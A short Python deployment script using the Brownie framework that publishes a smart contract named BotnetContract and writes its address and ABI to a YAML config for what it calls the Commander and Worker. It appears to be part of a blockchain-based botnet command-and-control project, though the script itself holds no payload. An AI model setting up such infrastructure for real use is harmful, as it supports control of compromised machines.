from brownie import BotnetContract
from scripts.helpful import get_account
import yaml

#
#   deploys BotnetContract and writes the address and ABI to botnet_config.yaml
#
def deploy_contract():
    account = get_account()
    botnet_contract = BotnetContract.deploy({"from": account}, publish_source=True)
    generate_config(botnet_contract)

#
#   generates config file for Commander and Worker
#
def generate_config(contract):
    botnet_config = {}
    botnet_config['contract'] = {}
    #commander_config['contract']['name'] = contract.name
    botnet_config['contract']['abi'] = contract.abi
    botnet_config['contract']['address'] = contract.address

    with open("botnet_config.yaml", 'w') as f:
        yaml.dump(botnet_config, f)

def main():
    deploy_contract()